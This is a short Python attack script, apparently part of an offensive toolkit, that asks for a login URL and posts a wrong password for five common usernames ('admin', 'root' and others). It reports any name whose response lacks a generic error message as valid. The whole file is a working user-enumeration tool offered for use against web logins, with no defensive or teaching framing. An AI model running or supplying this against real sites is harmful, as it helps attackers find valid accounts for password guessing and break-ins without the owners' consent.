#!/usr/bin/env python3
import requests

def user_enumeration(target_url):
    """[Enumerate users by testing valid usernames with login attempts]"""
    usernames = ['admin', 'user', 'test', 'guest', 'root']
    for username in usernames:
        payload = {'username': username, 'password': 'wrongpassword'}
        response = requests.post(target_url, data=payload)

        if "Invalid username or password" not in response.text:
            print(f"Valid username found: {username}")

# User input
target_url = input("\033[91mint4 [Enter the Login URL for User Enumeration] > \033[0m")
user_enumeration(target_url)